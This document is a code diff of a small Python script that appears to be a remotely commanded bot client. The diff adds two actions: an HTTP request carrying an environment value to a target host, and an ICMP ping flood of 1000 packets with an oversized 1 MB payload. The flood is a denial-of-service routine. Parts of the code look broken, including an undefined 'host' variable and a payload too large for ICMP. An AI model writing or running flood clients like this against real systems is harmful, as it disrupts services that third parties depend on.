@@ -1,5 +1,6 @@
-import os,  time, socket
-IP_address = "192.168.1.10"
+import os, requests, time, socket
+from icmplib import ping
+IP_address = os.environ['IP_address']
 Port = 65222
 
 def main():
@@ -13,9 +14,9 @@ def main():
         if cmd == '1':
             s = requests.session()
             for i in range(1):
-                pass     
+                s.get(f"http://{host}/?name={os.environ['name']}")        
         elif cmd == '2':
-            os.system("ping %s -c 100"%IP_address)      
+            ping(host, count=1000, interval=0.2, timeout=1, payload=('a'*1024*1024).encode('UTF-8'))           
 
 if __name__=="__main__":
     while True:
